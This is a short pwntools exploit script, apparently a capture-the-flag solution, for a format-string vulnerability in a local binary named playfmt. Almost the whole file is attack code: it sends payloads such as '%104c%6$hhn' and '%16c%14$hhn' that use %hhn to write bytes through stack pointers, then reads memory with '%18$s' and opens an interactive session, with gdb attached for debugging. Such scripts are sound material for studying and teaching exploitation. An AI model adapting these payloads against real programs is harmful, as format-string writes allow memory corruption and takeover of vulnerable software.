from pwn import *
context(os = 'linux', arch = 'i386', log_level = 'debug', terminal = ['tmux', 'splitw', '-h'])
p = process('./playfmt')

payload = '%104c%6$hhn'
p.sendline(payload)
gdb.attach(p)
p.sendline('%16c%14$hhn')
#sleep(10)
p.sendline('%18$s')

p.interactive()

